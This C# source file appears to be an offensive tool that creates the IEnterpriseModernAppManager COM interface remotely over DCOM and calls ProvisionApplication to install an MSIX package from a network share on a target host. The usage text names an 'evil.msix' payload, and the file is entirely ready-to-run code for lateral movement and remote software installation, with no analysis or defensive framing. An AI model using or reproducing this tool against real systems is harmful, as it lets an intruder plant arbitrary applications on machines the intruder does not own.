using System;
using System.Runtime.InteropServices;

namespace ProvisionAppx {

    [ComImport, Guid("fa90be90-d2d8-45f4-963b-d93ae231f6b7"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IEnterpriseModernAppManager {
        uint InstallApplication(string p0, string p1, string p2);
        uint UninstallApplication(string p0, string enrollmentId);
        uint ProvisionApplication(string p0, string xml, string p2);
        uint Proc6(string p0, string p1);
        uint Proc7(string p0, string p1);
    }

    class ProvisionAppx {
        static void Main(string[] args) {

            if(args.Length != 2) {
                Console.WriteLine("Usage: msix_path install_host\n" +
                                  "\t example: ProvisionAppX \\\\server\\share\\evil.msix 192.168.1.1");
                return;
            }

            Console.WriteLine($"[=] Attemptting to install appx/msix file {args[0]} on target host {args[1]}");

            var provisionXML = $@"<Application PackageUri=""{args[0]}"" DeploymentOptions=""0""></Application>";
            var t = Type.GetTypeFromCLSID(Guid.Parse("{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}"), args[1]);
            var o = (IEnterpriseModernAppManager)Activator.CreateInstance(t);

            Console.WriteLine($"[+] Created IEnterpriseModernAppManager DCOM interface on host {args[1]}");

            o.ProvisionApplication("arg", provisionXML, "arg");

            Console.WriteLine($"[+] Successfully provisioned application, if certificate is trusted app should install soon on target host");
        }
    }
}
